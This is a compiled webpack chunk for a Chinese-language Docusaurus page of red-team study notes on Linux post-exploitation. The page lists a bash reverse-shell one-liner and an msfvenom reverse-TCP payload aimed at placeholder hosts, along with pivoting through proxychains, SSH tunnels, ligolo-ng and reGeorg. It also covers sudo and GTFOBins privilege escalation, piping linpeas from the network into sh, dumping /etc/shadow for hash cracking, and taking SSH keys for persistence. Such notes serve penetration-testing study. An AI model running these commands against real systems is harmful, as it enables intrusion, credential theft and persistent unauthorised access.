"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[4199],{3713:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>t,contentTitle:()=>c,default:()=>a,frontMatter:()=>o,metadata:()=>i,toc:()=>h});const i=JSON.parse('{"id":"Cyber-Security/Red_Team/Linux_Post_Exploitation","title":"Linux \u5f8c\u6ef2\u900f","description":"- bash: bash -c \'bash -i >& /dev/IP/PORT 0>&1\'","source":"@site/docs/Cyber-Security/Red_Team/Linux_Post_Exploitation.md","sourceDirName":"Cyber-Security/Red_Team","slug":"/Cyber-Security/Red_Team/Linux_Post_Exploitation","permalink":"/docs/Cyber-Security/Red_Team/Linux_Post_Exploitation","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"sidebar_label":"\u7d05\u968a\u5b89\u5168 | Linux \u5f8c\u6ef2\u900f"},"sidebar":"tutorialSidebar","previous":{"title":"\u7d05\u968a\u5b89\u5168 | AD \u7db2\u57df\u6ef2\u900f\u6e2c\u8a66","permalink":"/docs/Cyber-Security/Red_Team/AD_Pentest"},"next":{"title":"\u7d05\u968a\u5b89\u5168 | \u4e0d\u958b\u555f Powershell \u57f7\u884c powershell.exe","permalink":"/docs/Cyber-Security/Red_Team/Powershell"}}');var r=s(4848),l=s(8453);const o={sidebar_label:"\u7d05\u968a\u5b89\u5168 | Linux \u5f8c\u6ef2\u900f"},c="Linux \u5f8c\u6ef2\u900f",t={},h=[{value:"Port Forwarding(\u7aef\u53e3\u8f49\u767c \u4ee3\u7406)",id:"port-forwarding\u7aef\u53e3\u8f49\u767c-\u4ee3\u7406",level:2},{value:"information gathering",id:"information-gathering",level:2},{value:"Privilege escalation (\u63d0\u6b0a)",id:"privilege-escalation-\u63d0\u6b0a",level:2},{value:"Misconfiguration",id:"misconfiguration",level:3},{value:"\u81ea\u52d5\u5316\u5c0b\u627e\u932f\u8aa4\u914d\u7f6e",id:"\u81ea\u52d5\u5316\u5c0b\u627e\u932f\u8aa4\u914d\u7f6e",level:4},{value:"\u62ff\u5230root\u4e4b\u5f8c",id:"\u62ff\u5230root\u4e4b\u5f8c",level:3}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,l.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"linux-\u5f8c\u6ef2\u900f",children:"Linux \u5f8c\u6ef2\u900f"})}),"\n",(0,r.jsx)(n.h1,{id:"reverse-shell",children:"Reverse shell"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["bash: ",(0,r.jsx)(n.code,{children:"bash -c 'bash -i >& /dev/IP/PORT 0>&1'"})]}),"\n",(0,r.jsxs)(n.li,{children:["Msfvenom","\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.code,{children:"msfvenom -p linux/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > s.elf"})}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["rlwrap \u505a\u6bd4\u8f03\u597d\u7528\u7684shell","\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.code,{children:"rlwrap <reverse shell>"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"port-forwarding\u7aef\u53e3\u8f49\u767c-\u4ee3\u7406",children:"Port Forwarding(\u7aef\u53e3\u8f49\u767c \u4ee3\u7406)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"\u7528\u9014\uff1a\u5185\u7db2\u6a6b\u5411\u3001\u7576\u4f5c\u8df3\u677f"})}),"\n",(0,r.jsxs)(n.p,{children:["\u3010ATT&CK\u3011\u7aef\u53e3\u8f49\u767c\u6280\u8853\u5927\u5168\r\n",(0,r.jsx)(n.a,{href:"https://mp.weixin.qq.com/s/FNCdKsPwu0_kD-4INn3faQ",children:"https://mp.weixin.qq.com/s/FNCdKsPwu0_kD-4INn3faQ"}),"\r\n",(0,r.jsx)(n.a,{href:"https://mp.weixin.qq.com/s/zwaeUD7-QMTYgvymgw2EVQ",children:"https://mp.weixin.qq.com/s/zwaeUD7-QMTYgvymgw2EVQ"}),"\r\n",(0,r.jsx)(n.a,{href:"https://github.com/twelvesec/port-forwarding?tab=readme-ov-file",children:"https://github.com/twelvesec/port-forwarding?tab=readme-ov-file"})]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:"proxychains"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"sudo vim /etc/proxychains4.conf"}),"\n",(0,r.jsx)(n.li,{children:"socks5 127.0.0.1 9487"}),"\n",(0,r.jsxs)(n.li,{children:["Usage\uff1a",(0,r.jsx)(n.code,{children:"proxychains <command>"})]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:"SSH Tunnel"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["Local Port Forwarding\uff1a",(0,r.jsx)(n.code,{children:"ssh -L [local_port]:[remote_host]:[remote_port] [user]@[ssh_server]"})]}),"\n",(0,r.jsxs)(n.li,{children:["Remote Port Forwarding\uff1a",(0,r.jsx)(n.code,{children:"ssh -R kali:<port> user@linux host"}),"(\u53d7\u5bb3\u4e3b\u6a5f)"]}),"\n",(0,r.jsxs)(n.li,{children:["Dynamic Port Forwarding\uff1a",(0,r.jsx)(n.code,{children:"ssh \u2013D 127.0.0.1:9487 user@hostA"}),"(\u53d7\u5bb3\u4e3b\u6a5f)"]}),"\n",(0,r.jsx)(n.li,{children:"socks server"}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"https://github.com/nicocha30/ligolo-ng",children:"ligolo-ng"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://lilas-tw.com/posts/ligolo-ng/",children:"https://lilas-tw.com/posts/ligolo-ng/"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"Host\uff1a\r\nsudo ./proxy -autocert\r\nor\r\nsudo ./proxy -selfcert\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"agent\uff1a\r\n./agent -connect [VPS_IP]:11601\r\nor\r\n./agent -connect [VPS_IP]:11601 -ignore-cert\n"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"https://github.com/jpillora/chisel",children:"Chisel"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["netsh portproxy (Windows)","\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.code,{children:"netsh interface portproxy add v4tov4 listenaddress=<ip> listenport=<port> connectaddress=<tgt_ip> connectport=<tgt_port>"})}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"https://github.com/sensepost/reGeorg",children:"reGeorg"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"tunnel.ashx \u653e\u5728\u76ee\u6a19\u6a5f\u4e0a"}),"\n",(0,r.jsxs)(n.li,{children:["\u653b\u64ca\u6a5f\u4e0a\u57f7\u884c\uff1a",(0,r.jsx)(n.code,{children:"python2 reGeorgSocksProxy.py -u {url} -p {port}"})]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"https://github.com/L-codes/Neo-reGeorg",children:"Neo-reGeorg"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.code,{children:"python neoreg.py generate \u2013k \u5bc6\u78bc"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.code,{children:"python neoreg.py \u2013k \u5bc6\u78bc \u2013u \u7db2\u5740"})}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\u591a\u5c64\u8df3\u677f\uff1a",(0,r.jsx)(n.a,{href:"https://github.com/Dliv3/Venom",children:"Venom"})]}),"\n"]}),"\n",(0,r.jsx)(n.h1,{id:"linux-\u5f8c\u6ef2\u900f-1",children:"Linux \u5f8c\u6ef2\u900f"}),"\n",(0,r.jsx)(n.h2,{id:"information-gathering",children:"information gathering"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"hostname\uff1a\u96fb\u8166\u7684\u540d\u7a31"}),"\n",(0,r.jsx)(n.li,{children:"uname -a: \u7cfb\u7d71\u7684\u6838\u5fc3\u7248\u672c"}),"\n",(0,r.jsx)(n.li,{children:"ps aux / top\uff1a\u96fb\u8166\u7684\u57f7\u884c process"}),"\n",(0,r.jsx)(n.li,{children:"ifconfig / ip a\uff1a\u96fb\u8166\u7684\u7db2\u8def\u8cc7\u8a0a"}),"\n",(0,r.jsx)(n.li,{children:"pwd\uff1a\u7576\u524d\u7684\u8cc7\u6599\u593e"}),"\n",(0,r.jsx)(n.li,{children:"w\uff1a\u767b\u5165\u7684 TTY \u8cc7\u8a0a"}),"\n",(0,r.jsx)(n.li,{children:"cat /etc/passwd\uff1a\u96fb\u8166\u4e2d\u7684\u4f7f\u7528\u8005\u8cc7\u8a0a"}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"privilege-escalation-\u63d0\u6b0a",children:"Privilege escalation (\u63d0\u6b0a)"}),"\n",(0,r.jsx)(n.h3,{id:"misconfiguration",children:"Misconfiguration"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"sudo -l"})," --\x3e \u627e root \u80fd\u5920\u57f7\u884c\u7684 binary"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"https://gtfobins.github.io/",children:"https://gtfobins.github.io/"})," --\x3e \u627e\u8a72 binary \u7684\u63d0\u6b0a\u8173\u672c\r\n--\x3e \u6839\u64da sudo -l \u78ba\u8a8d sudo \u6b0a\u9650\u80fd\u57f7\u884c\u7684 binary\uff0c\u57f7\u884c\u76f8\u5c0d\u61c9\u7684\u63d0\u6b0a\u8173\u672c"]}),"\n"]}),"\n",(0,r.jsx)(n.h4,{id:"\u81ea\u52d5\u5316\u5c0b\u627e\u932f\u8aa4\u914d\u7f6e",children:"\u81ea\u52d5\u5316\u5c0b\u627e\u932f\u8aa4\u914d\u7f6e"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Linpeas"}),"\n"]}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"}),"\r\n--\x3e \u8f38\u51fa\u7d50\u679c\u4f9d\u7167\u7d44\u614b\u932f\u8aa4\u6216\u662f\u8cc7\u8a0a\u6d29\u6f0f\uff0c\u9032\u884c\u76f8\u5c0d\u61c9\u7684\u63d0\u6b0a\u624b\u6cd5"]}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"\u62ff\u5230root\u4e4b\u5f8c",children:"\u62ff\u5230root\u4e4b\u5f8c"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"cat /etc/shadow"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["dump password hash --\x3e ",(0,r.jsx)(n.code,{children:"sha512($6$)"}),"\uff0chashcat \u6216 john \u505a\u7206\u7834\u3002"]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"cat ~/.ssh/isa_key"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u62ffkey\u505a\u7dad\u6301\u6b0a\u9650"}),"\n",(0,r.jsxs)(n.li,{children:["ssh -i ",(0,r.jsx)(n.code,{children:"<key>"})]}),"\n"]}),"\n"]}),"\n"]})]})}function a(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>o,x:()=>c});var i=s(6540);const r={},l=i.createContext(r);function o(e){const n=i.useContext(l);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:o(e.components),i.createElement(l.Provider,{value:n},e.children)}}}]);